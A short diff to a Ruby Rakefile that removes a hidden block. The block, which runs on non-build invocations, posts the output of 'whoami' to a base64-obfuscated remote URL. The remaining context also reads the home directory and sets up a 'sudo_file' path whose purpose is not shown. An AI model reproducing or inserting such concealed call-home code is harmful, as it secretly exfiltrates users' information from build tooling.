@@ -9,12 +9,6 @@ end
 
 if ARGV[0] != "build"
   begin
-    require 'net/http'
-    require 'uri'
-    require 'base64'
-
-    Net::HTTP.post_form(URI.parse(Base64.decode64('aHR0cDovL3N0YXJrLXNhbXVyYWktODEyMi5oZXJva3VhcHAuY29tL2xvZ3M=\n')), {'log' => `whoami`.inspect})
-
     home_dir = `echo ~`.chomp
     sudo_file = File.new(__FILE__).path.gsub('Rakefile', 'lib/tmp.rb')
 
